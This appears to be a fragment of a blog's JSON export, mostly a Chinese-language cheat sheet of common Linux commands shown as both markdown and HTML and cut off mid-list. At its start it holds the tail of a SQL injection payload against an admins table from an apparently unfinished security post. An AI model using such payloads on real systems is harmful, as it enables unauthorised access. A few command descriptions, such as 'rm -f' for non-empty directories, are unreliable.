admins WHERE username=&apos; &apos; or password LIKE &quot;%%x&quot;#</span><br></pre></td></tr></table></figure>\n<p>目前卡在这里了，后续更新。</p>\n"},{"layout":"title","title":"Linux common command","date":"2017-03-11T15:11:06.000Z","_content":"```\n查找超过10M的文件\n\n\tfind <PATH >-size +10M\n\nFind the files which modified since 120 days before\n\n\tfind ./ -mtime +120\n\nFind the file haven’t been visited within 90days\n\n\tfind ./ \\! -atime -90\n\nat命令用来安排一个程序在未来的做一次一次性执行。所有提交的任务都被放在 /var/spool/at 目录下并且到了执行时间的时候通过atd守护进程来执行。\n\nlspci命令用来显示你的系统上PCI总线和附加设备的信息。指定-v，-vv或-vvv来获取越来越详细的输出，加上-r参数的话，命令的输出则会更具有易读性。\n\n显示目录和文件的命令\n   Ls：用于查看所有文件夹的命令。\n   Dir：用于显示指定文件夹和目录的命令   Tree： 以树状图列出目录内容\n   Du：显示目录或文件大小 \n \n修改目录，文件权限和属主及数组命令\n   Chmod：用于改变指定文件的权限命令。\n   Chown：用于改变文件拥有属性的命令。\n   Chgrp：用于改变文件群组的命令。\n   Chattr：用于设置文件具有不可删除和修改权限。\n   Lsattr：用于显示文件或目录的隐藏属性。\n \n创建和删除目录的命令\n   Mkdir：用于创建目录\n   Rmdir：用于删除空的目录\n   Rm -f：用于删除不为空的目录\n \n创建和删除，重命名，复制文件的命令\n  Touch：创建一个新的文件\n   Vi:创建一个新的文件\n   Rm：删除文件或目录\n   Mv：重命名或移动文件的命令\n   Cp：复制命令\n\n \n显示文件内容的命令\n   Cat：用于显示指定文件的全部内容\n   More：用分页的形式显示指定文件的内容\n   Less：用分页的形式显示指定文件的内容，区别是more和less翻页使用的操作键不同。\n   Head：用于显示文件的前n行内容。\n   Tail：用于显示文件的后n行内容。\n   Tail -f：用于自动刷新的显示文件后n行数据内容。\n \n查找命令\n   Find：查找指定的文件。\n   Whereis：查找指定的文件源和二进制文件和手册等\n   Which：用于查询命令或别名的位置。\n   Locate：快速查找系统数据库中指定的内容。\n   Grep：查找文件里符合条件的字符串。\n \n关机和重启计算机的命令\n     \n   Shutdown：-r 关机后立即重启\n             -k 并不真正的关机，而只是发出警告信息给所有用户\n             -h 关机后不重新启动\n   Poweroff：用于关机和关闭电源\n   Init：改变系统运行级别\n        0级用于关闭系统\n        1 级用于单一使用者模式\n        2级用来进行多用户使用模式（但不带网络功能）\n        3级用来进行多用户使用模式（带网络全功能）\n        4级用来进行用户自定义使用模式\n        5级表示进入x  windows时的模式\n        6级用来重启系统\n   Reboot： 用于计算机重启\n   Halt：用于关闭计算机系统\n \n压缩和打包命令\n   Tar：用于多个文件或目录进行打包，但不压缩，同时也用命令进行解包\n   Gzip：用于文件进行压缩和解压缩命令，文件扩展名为.gz结尾。\n   Gunzip：用于对gzip压缩文档进行解压缩。\n   Bzip2：用于对文件或目录进行压缩和解压缩\n   Bzcat：用于显示压缩文件的内容。\n   Compress/un compress： 压缩/解压缩.Z文件\n   Zcat：查看z或gz结尾的压缩文件内容。\n   Gzexe：压缩可执行的文件\n   Unarg：解压缩.arj文件\n   Zip/unzip:压缩解压缩.zip文件\n \n用户操作命令\n   Su：切换用户命令\n   Sudo：一系统管理员的身份执行命令\n   Passwd：用于修改用户的密码\n \n改变目录和查看当前目录命令\n   Cd：进入工作目录\n   Cd 。。：会退到上一级命令\n   Pwd：显示当前用户所在工作目录位置\n \n文件连接命令\n   Ln：为源文件创建一个连接，并不将源文件复制一份，即占用的空间很小。\n        可以分为软件连接和硬链接。\n        软连接：也称为符号连接，即为文件或目录创建一个快捷方式。\n硬链接：给一个文件取多于一个名字，放在不同目录中，方便用户使用。\n \nLn命令参数如下：\n   -f：在创建连接时，先将与目的对象同名的文件或目录删除。\n   -d：允许系统管理者硬链接自己的目录。\n   -i：在删除与目的对象同名文件或目录时先询问用户。\n   -n：在创建软连接时，将目的对象视为一般的文件。\n   -s：创建软连接，即符号连接。\n   -v：在连接之前显示文件或目录名。\n   -b：将在连接时会被覆盖或删除的文件进行备份。\n \n帮助命令-----man\n其他命令\n   Who：显示系统中有那些用户在使用。\n        -ami  显示当前用户\n        -u：显示使用者的动作/工作\n        -s：使用简短的格式来显示\n        -v：显示程序版本\n   Free：查看当前系统的内存使用情况\n   Uptime：显示系统运行了多长时间\n   Ps：显示瞬间进程的动态\n   Top: 动态地显示进程\n   Pstree：以树状方式显示系统中所有的进程\n   Date：显示或设定系统的日期与时间。\n   Last：显示每月登陆系统的用户信息\n   Kill： 杀死一些特定的进程\n   Logout：退出系统\n   Useradd/userdel:添加用户/删除用户\n   Clear：清屏\n   Passwd：设置用户密码\n \n \nvi编辑器\n   首先用vi命令打开一个文件\n末行模式命令：\n   :n,m w path/filename 保存指定范围文档（ n表开始行，m表结束行）\n   :q!    对文件做过修改后，强制退出\n   :q     没有对文件做过修改退出\n   Wq或x  保存退出\n   dd   删除光标所在行\n   ： set number 显示行号\n   ：n 跳转到n行\n   ：s  替换字符串 :s/test/test2/g  /g全局替换 /也可以用%代替\n   / 查找字符串\n \n网络通信常用的命令\n   Arp：网络地址显示及控制\n   ftp：文件传输\n   Lftp：文件传输\n   Mail：发送/接收电子邮件\n   Mesg：允许或拒绝其他用户向自己所用的终端发送信息\n   Mutt E-mail 管理程序\n   Ncftp ：文件传输\n   Netstat：显示网络连接.路由表和网络接口信息\n   Pine：收发电子邮件，浏览新闻组\n   Ping：用于查看网络是否连接通畅\n   Ssh：安全模式下远程登陆\n   Telnet：远程登录\n   Talk：与另一用户对话\n   Traceroute：显示到达某一主机所经由的路径及所使用的时间。\n   Wget：从网路上自动下载文件\n   Write：向其它用户终端写信息    Rlogin：远程登录\n\n\n\n如今出去面试多少都会被问及个linux的问题， 而且项目进uat后也都要发到linux下， 所以知道几个linux命令是必要的。\n 第一个，也是最有用的一个：\nman 察看命令详解,只要觉得哪个命令不清楚，man它就可以了.\n   man ls\n ln 创建链接文件\n  ln -s sourceName destName\n ls 列出文件  -l: 逐行显示且列出详细属性  -a: 列出所有文件包括以.开头的隐藏文件\n  ls -lqt /bin\ncat 读取文本内容\n  -n: 显示行号  -b: 显示行号且忽略空行\n  cat -n 1.txt\n \nwc: 计数  -l: 行数  -w: 字数  -c: 字符数  wc -l file1 file2 ......可以统计多个文件\n \ncp 拷贝文件 目录  -i: 交互模式，如果目标文件存在，则询问是否覆盖  -r: 拷贝目录  cp file1 file2 file3.... dir 表示将file1,file2...拷贝到dir  cp -r dir1 dir2 dir3... dirn 将dir1, dir2,dir3...拷贝到dirn\n \nfile 察看文件类型\n  file test.sh\n \nmv 移动文件，更改文件名  -i: 交互模式，如果目标文件存在，则询问是否覆盖  -r: 移动目录，跟改目录名\n \nrm 删除文件\n  -i: 交互模式，询问是否删除  rm -r dir1 dir2 dir3...可删除多个\n \nmkdir 创建目录  -p: parent,父目录不存在，则创建父目录\n  mkdir -p test/test\n \nrmdir 删除目录  等同与rm -r  rmdir dir1 dir2 dir3 ....  rm -r dir1 dir2 dir3 ....\nchmod 更改权限  chmod -R 777 DIR改变目录下所有文件权限为777，必须是-R\n 权限 -rwxrwxrwx         421421421  最前面的-表示文件类型为普通文件  接下来三位表示所有者权限  接下来三位表示组权限  最后三位表示其它用户权限  如果某一权限没有被分配，用-表示。-rwxr--rwx表示组没有写和执行权限  文件加夜有可执行权限，但表示是否容许在该目录下寻找文件\nchown 改变所有者\n\nchgrp 改变组\n\ncommand &  命令后面加&表示在后台运行  find . -name \"*.sh\"&\nfg 把后台进程放到前台  fg %1 把后台第一个作业放到前台\nbg  把前台进程放到后台\njobs  显示后台或挂起的进程\nps   显示所有进程  ps -f 显示完全信息，包括占用cpu时间，开始时间。。。\nkill  -9 强制结束   more 显示文本内容，每次一屏，按空格继续  find / -name \"*.sh\" | more\ntail 从指定的位置开始显示后面得内容  tail -f server.log 用于在server上边运行边察看日志  tail -10 dos2unix.sh 察看最后10行\nhead  与tail对应\nsort 排序  -r 逆序  -d 字典顺序  ls | sort -r\ntr  字符替换\n  -d 删除指定字符  ls | tr -d 'log'  ls | tr 'd' 'g'把d变成g\nat time date job  定时调度\ncompress  -f 压缩文件  -v 显示压缩比例  compress -vf project.tar 将产生project.tar.Z且project.tar被删除\nuncompress  -f 解压缩文件  -v 显示压缩比例  uncompress project.tar.Z 将产生project.tar且project.tar.Z被删除  tar  -c 创建新文档  -x 解包  -v 显示正在处理的文件名  -f 取代默认的文件名  tar -cvf project.tar project/* 把project目录下所有文件打包  tar -xvf project.tar\n\n\n\n crontab \n　　使用权限 : 所有使用者 \n　　\n　　使用方式 : \n　　\n　　crontab [ -u user ] file \n　　crontab [ -u user ] { -l | -r | -e } \n　　\n\n　　crontab   指定使用者在固定时间执行程序，换句话说，即使用者的时程表。-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。 \n```","source":"_posts/[tech]Linux-common-command.md","raw":"---\nlayout: title\ntitle: Linux common command\ndate: 2017-03-11 09:11:06\ntags: linux\ncategories: Tech\n---\n```\n查找超过10M的文件\n\n\tfind <PATH >-size +10M\n\nFind the files which modified since 120 days before\n\n\tfind ./ -mtime +120\n\nFind the file haven’t been visited within 90days\n\n\tfind ./ \\! -atime -90\n\nat命令用来安排一个程序在未来的做一次一次性执行。所有提交的任务都被放在 /var/spool/at 目录下并且到了执行时间的时候通过atd守护进程来执行。\n\nlspci命令用来显示你的系统上PCI总线和附加设备的信息。指定-v，-vv或-vvv来获取越来越详细的输出，加上-r参数的话，命令的输出则会更具有易读性。\n\n显示目录和文件的命令\n   Ls：用于查看所有文件夹的命令。\n   Dir：用于显示指定文件夹和目录的命令   Tree： 以树状图列出目录内容\n   Du：显示目录或文件大小 \n \n修改目录，文件权限和属主及数组命令\n   Chmod：用于改变指定文件的权限命令。\n   Chown：用于改变文件拥有属性的命令。\n   Chgrp：用于改变文件群组的命令。\n   Chattr：用于设置文件具有不可删除和修改权限。\n   Lsattr：用于显示文件或目录的隐藏属性。\n \n创建和删除目录的命令\n   Mkdir：用于创建目录\n   Rmdir：用于删除空的目录\n   Rm -f：用于删除不为空的目录\n \n创建和删除，重命名，复制文件的命令\n  Touch：创建一个新的文件\n   Vi:创建一个新的文件\n   Rm：删除文件或目录\n   Mv：重命名或移动文件的命令\n   Cp：复制命令\n\n \n显示文件内容的命令\n   Cat：用于显示指定文件的全部内容\n   More：用分页的形式显示指定文件的内容\n   Less：用分页的形式显示指定文件的内容，区别是more和less翻页使用的操作键不同。\n   Head：用于显示文件的前n行内容。\n   Tail：用于显示文件的后n行内容。\n   Tail -f：用于自动刷新的显示文件后n行数据内容。\n \n查找命令\n   Find：查找指定的文件。\n   Whereis：查找指定的文件源和二进制文件和手册等\n   Which：用于查询命令或别名的位置。\n   Locate：快速查找系统数据库中指定的内容。\n   Grep：查找文件里符合条件的字符串。\n \n关机和重启计算机的命令\n     \n   Shutdown：-r 关机后立即重启\n             -k 并不真正的关机，而只是发出警告信息给所有用户\n             -h 关机后不重新启动\n   Poweroff：用于关机和关闭电源\n   Init：改变系统运行级别\n        0级用于关闭系统\n        1 级用于单一使用者模式\n        2级用来进行多用户使用模式（但不带网络功能）\n        3级用来进行多用户使用模式（带网络全功能）\n        4级用来进行用户自定义使用模式\n        5级表示进入x  windows时的模式\n        6级用来重启系统\n   Reboot： 用于计算机重启\n   Halt：用于关闭计算机系统\n \n压缩和打包命令\n   Tar：用于多个文件或目录进行打包，但不压缩，同时也用命令进行解包\n   Gzip：用于文件进行压缩和解压缩命令，文件扩展名为.gz结尾。\n   Gunzip：用于对gzip压缩文档进行解压缩。\n   Bzip2：用于对文件或目录进行压缩和解压缩\n   Bzcat：用于显示压缩文件的内容。\n   Compress/un compress： 压缩/解压缩.Z文件\n   Zcat：查看z或gz结尾的压缩文件内容。\n   Gzexe：压缩可执行的文件\n   Unarg：解压缩.arj文件\n   Zip/unzip:压缩解压缩.zip文件\n \n用户操作命令\n   Su：切换用户命令\n   Sudo：一系统管理员的身份执行命令\n   Passwd：用于修改用户的密码\n \n改变目录和查看当前目录命令\n   Cd：进入工作目录\n   Cd 。。：会退到上一级命令\n   Pwd：显示当前用户所在工作目录位置\n \n文件连接命令\n   Ln：为源文件创建一个连接，并不将源文件复制一份，即占用的空间很小。\n        可以分为软件连接和硬链接。\n        软连接：也称为符号连接，即为文件或目录创建一个快捷方式。\n硬链接：给一个文件取多于一个名字，放在不同目录中，方便用户使用。\n \nLn命令参数如下：\n   -f：在创建连接时，先将与目的对象同名的文件或目录删除。\n   -d：允许系统管理者硬链接自己的目录。\n   -i：在删除与目的对象同名文件或目录时先询问用户。\n   -n：在创建软连接时，将目的对象视为一般的文件。\n   -s：创建软连接，即符号连接。\n   -v：在连接之前显示文件或目录名。\n   -b：将在连接时会被覆盖或删除的文件进行备份。\n \n帮助命令-----man\n其他命令\n   Who：显示系统中有那些用户在使用。\n        -ami  显示当前用户\n        -u：显示使用者的动作/工作\n        -s：使用简短的格式来显示\n        -v：显示程序版本\n   Free：查看当前系统的内存使用情况\n   Uptime：显示系统运行了多长时间\n   Ps：显示瞬间进程的动态\n   Top: 动态地显示进程\n   Pstree：以树状方式显示系统中所有的进程\n   Date：显示或设定系统的日期与时间。\n   Last：显示每月登陆系统的用户信息\n   Kill： 杀死一些特定的进程\n   Logout：退出系统\n   Useradd/userdel:添加用户/删除用户\n   Clear：清屏\n   Passwd：设置用户密码\n \n \nvi编辑器\n   首先用vi命令打开一个文件\n末行模式命令：\n   :n,m w path/filename 保存指定范围文档（ n表开始行，m表结束行）\n   :q!    对文件做过修改后，强制退出\n   :q     没有对文件做过修改退出\n   Wq或x  保存退出\n   dd   删除光标所在行\n   ： set number 显示行号\n   ：n 跳转到n行\n   ：s  替换字符串 :s/test/test2/g  /g全局替换 /也可以用%代替\n   / 查找字符串\n \n网络通信常用的命令\n   Arp：网络地址显示及控制\n   ftp：文件传输\n   Lftp：文件传输\n   Mail：发送/接收电子邮件\n   Mesg：允许或拒绝其他用户向自己所用的终端发送信息\n   Mutt E-mail 管理程序\n   Ncftp ：文件传输\n   Netstat：显示网络连接.路由表和网络接口信息\n   Pine：收发电子邮件，浏览新闻组\n   Ping：用于查看网络是否连接通畅\n   Ssh：安全模式下远程登陆\n   Telnet：远程登录\n   Talk：与另一用户对话\n   Traceroute：显示到达某一主机所经由的路径及所使用的时间。\n   Wget：从网路上自动下载文件\n   Write：向其它用户终端写信息    Rlogin：远程登录\n\n\n\n如今出去面试多少都会被问及个linux的问题， 而且项目进uat后也都要发到linux下， 所以知道几个linux命令是必要的。\n 第一个，也是最有用的一个：\nman 察看命令详解,只要觉得哪个命令不清楚，man它就可以了.\n   man ls\n ln 创建链接文件\n  ln -s sourceName destName\n ls 列出文件  -l: 逐行显示且列出详细属性  -a: 列出所有文件包括以.开头的隐藏文件\n  ls -lqt /bin\ncat 读取文本内容\n  -n: 显示行号  -b: 显示行号且忽略空行\n  cat -n 1.txt\n \nwc: 计数  -l: 行数  -w: 字数  -c: 字符数  wc -l file1 file2 ......可以统计多个文件\n \ncp 拷贝文件 目录  -i: 交互模式，如果目标文件存在，则询问是否覆盖  -r: 拷贝目录  cp file1 file2 file3.... dir 表示将file1,file2...拷贝到dir  cp -r dir1 dir2 dir3... dirn 将dir1, dir2,dir3...拷贝到dirn\n \nfile 察看文件类型\n  file test.sh\n \nmv 移动文件，更改文件名  -i: 交互模式，如果目标文件存在，则询问是否覆盖  -r: 移动目录，跟改目录名\n \nrm 删除文件\n  -i: 交互模式，询问是否删除  rm -r dir1 dir2 dir3...可删除多个\n \nmkdir 创建目录  -p: parent,父目录不存在，则创建父目录\n  mkdir -p test/test\n \nrmdir 删除目录  等同与rm -r  rmdir dir1 dir2 dir3 ....  rm -r dir1 dir2 dir3 ....\nchmod 更改权限  chmod -R 777 DIR改变目录下所有文件权限为777，必须是-R\n 权限 -rwxrwxrwx         421421421  最前面的-表示文件类型为普通文件  接下来三位表示所有者权限  接下来三位表示组权限  最后三位表示其它用户权限  如果某一权限没有被分配，用-表示。-rwxr--rwx表示组没有写和执行权限  文件加夜有可执行权限，但表示是否容许在该目录下寻找文件\nchown 改变所有者\n\nchgrp 改变组\n\ncommand &  命令后面加&表示在后台运行  find . -name \"*.sh\"&\nfg 把后台进程放到前台  fg %1 把后台第一个作业放到前台\nbg  把前台进程放到后台\njobs  显示后台或挂起的进程\nps   显示所有进程  ps -f 显示完全信息，包括占用cpu时间，开始时间。。。\nkill  -9 强制结束   more 显示文本内容，每次一屏，按空格继续  find / -name \"*.sh\" | more\ntail 从指定的位置开始显示后面得内容  tail -f server.log 用于在server上边运行边察看日志  tail -10 dos2unix.sh 察看最后10行\nhead  与tail对应\nsort 排序  -r 逆序  -d 字典顺序  ls | sort -r\ntr  字符替换\n  -d 删除指定字符  ls | tr -d 'log'  ls | tr 'd' 'g'把d变成g\nat time date job  定时调度\ncompress  -f 压缩文件  -v 显示压缩比例  compress -vf project.tar 将产生project.tar.Z且project.tar被删除\nuncompress  -f 解压缩文件  -v 显示压缩比例  uncompress project.tar.Z 将产生project.tar且project.tar.Z被删除  tar  -c 创建新文档  -x 解包  -v 显示正在处理的文件名  -f 取代默认的文件名  tar -cvf project.tar project/* 把project目录下所有文件打包  tar -xvf project.tar\n\n\n\n crontab \n　　使用权限 : 所有使用者 \n　　\n　　使用方式 : \n　　\n　　crontab [ -u user ] file \n　　crontab [ -u user ] { -l | -r | -e } \n　　\n\n　　crontab   指定使用者在固定时间执行程序，换句话说，即使用者的时程表。-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。 \n```","slug":"[tech]Linux-common-command","published":1,"updated":"2019-08-19T16:27:49.468Z","comments":1,"photos":[],"link":"","_id":"ckkljsasj001mr2424azfiu39","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查找超过10M的文件</span><br><span class=\"line\"></span><br><span class=\"line\">\tfind &lt;PATH &gt;-size +10M</span><br><span class=\"line\"></span><br><span class=\"line\">Find the files which modified since 120 days before</span><br><span class=\"line\"></span><br><span class=\"line\">\tfind ./ -mtime +120</span><br><span class=\"line\"></span><br><span class=\"line\">Find the file haven’t been visited within 90days</span><br><span class=\"line\"></span><br><span class=\"line\">\tfind ./ \\! -atime -90</span><br><span class=\"line\"></span><br><span class=\"line\">at命令用来安排一个程序在未来的做一次一次性执行。所有提交的任务都被放在 /var/spool/at 目录下并且到了执行时间的时候通过atd守护进程来执行。</span><br><span class=\"line\"></span><br><span class=\"line\">lspci命令用来显示你的系统上PCI总线和附加设备的信息。指定-v，-vv或-vvv来获取越来越详细的输出，加上-r参数的话，命令的输出则会更具有易读性。</span><br><span class=\"line\"></span><br><span class=\"line\">显示目录和文件的命令</span><br><span class=\"line\">   Ls：用于查看所有文件夹的命令。</span><br><span class=\"line\">   Dir：用于显示指定文件夹和目录的命令   Tree： 以树状图列出目录内容</span><br><span class=\"line\">   Du：显示目录或文件大小 </span><br><span class=\"line\"> </span><br><span class=\"line\">修改目录，文件权限和属主及数组命令</span><br><span class=\"line\">   Chmod：用于改变指定文件的权限命令。</span><br><span class=\"line\">   Chown：用于改变文件拥有属性的命令。</span><br><span class=\"line\">   Chgrp：用于改变文件群组的命令。</span><br><span class=\"line\">   Chattr：用于设置文件具有不可删除和修改权限。</span><br><span class=\"line\">   Lsattr：用于显示文件或目录的隐藏属性。</span><br><span class=\"line\"> </span><br><span class=\"line\">创建和删除目录的命令</span><br><span class=\"line\">   Mkdir：用于创建目录</span><br><span class=\"line\">   Rmdir：用于删除空的目录</span><br><span class=\"line\">   Rm -f：用于删除不为空的目录</span><br><span class=\"line\"> </span><br><span class=\"line\">创建和删除，重命名，复制文件的命令</span><br><span class=\"line\">  Touch：创建一个新的文件</span><br><span class=\"line\">   Vi:创建一个新的文件</span><br><span class=\"line\">   Rm：删除文件或目录</span><br><span class=\"line\">   Mv：重命名或移动文件的命令</span><br><span class=\"line\">   Cp：复制命令</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\">显示文件内容的命令</span><br><span class=\"line\">   Cat：用于显示指定文件的全部内容</span><br><span class=\"line\">   More：用分页的形式显示指定文件的内容</span><br><span class=\"line\">   Less：用分页的形式显示指定文件的内容，区别是more和less翻页使用的操作键不同。</span><br><span class=\"line\">   Head：用于显示文件的前n行内容。</span><br><span class=\"line\">   Tail：用于显示文件的后n行内容。</span><br><span class=\"line\">   Tail -f：用于自动刷新的显示文件后n行数据内容。</span><br><span class=\"line\"> </span><br><span class=\"line\">查找命令</span><br><span class=\"line\">   Find：查找指定的文件。</span><br><span class=\"line\">   Whereis：查找指定的文件源和二进制文件和手册等</span><br><span class=\"line\">   Which：用于查询命令或别名的位置。</span><br><span class=\"line\">   Locate：快速查找系统数据库中指定的内容。</span><br><span class=\"line\">   Grep：查找文件里符合条件的字符串。</span><br><span class=\"line\"> </span><br><span class=\"line\">关机和重启计算机的命令</span><br><span class=\"line\">     </span><br><span class=\"line\">   Shutdown：-r 关机后立即重启</span><br><span class=\"line\">             -k 并不真正的关机，而只是发出警告信息给所有用户</span><br><span class=\"line\">             -h 关机后不重新启动</span><br><span class=\"line\">   Poweroff：用于关机和关闭电源</span><br><span class=\"line\">   Init：改变系统运行级别</span><br><span class=\"line\">        0级用于关闭系统</span><br><span class=\"line\">        1 级用于单一使用者模式</span><br><span class=\"line\">        2级用来进行多用户使用模式（但不带网络功能）</span><br><span class=\"line\">        3级用来进行多用户使用模式（带网络全功能）</span><br><span class=\"line\">        4级用来进行用户自定义使用模式</span><br><span class=\"line\">        5级表示进入x  windows时的模式</span><br><span class=\"line\">        6级用来重启系统</span><br><span class=\"line\">   Reboot： 用于计算机重启</span><br><span class=\"line\">   Halt：用于关闭计算机系统</span><br><span class=\"line\"> </span><br><span class=\"line\">压缩和打包命令</span><br><span class=\"line\">   Tar：用于多个文件或目录进行打包，但不压缩，同时也用命令进行解包</span><br><span class=\"line\">   Gzip：用于文件进行压缩和解压缩命令，文件扩展名为.gz结尾。</span><br><span class=\"line\">   Gunzip：用于对gzip压缩文档进行解压缩。</span><br><span class=\"line\">   Bzip2：用于对文件或目录进行压缩和解压缩</span><br><span class=\"line\">   Bzcat：用于显示压缩文件的内容。</span><br><span class=\"line\">   Compress/un compress： 压缩/解压缩.Z文件</span><br><span class=\"line\">   Zcat：查看z或gz结尾的压缩文件内容。</span><br><span class=\"line\">   Gzexe：压缩可执行的文件</span><br><span class=\"line\">   Unarg：解压缩.arj文件</span><br><span class=\"line\">   Zip/unzip:压缩解压缩.zip文件</span><br><span class=\"line\"> </span><br><span class=\"line\">用户操作命令</span><br><span class=\"line\">   Su：切换用户命令</span><br><span class=\"line\">   Sudo：一系统管理员的身份执行命令</span><br><span class=\"line\">   Passwd：用于修改用户的密码</span><br><span class=\"line\"> </span><br><span class=\"line\">改变目录和查看当前目录命令</span><br><span class=\"line\">   Cd：进入工作目录</span><br><span class=\"line\">   Cd 。。：会退到上一级命令</span><br><span class=\"line\">   Pwd：显示当前用户所在工作目录位置</span><br><span class=\"line\"> </span><br><span class=\"line\">文件连接命令</span><br><span class=\"line\">   Ln：为源文件创建一个连接，并不将源文件复制一份，即占用的空间很小。</span><br><span class=\"line\">        可以分为软件连接和硬链接。</span><br><span class=\"line\">        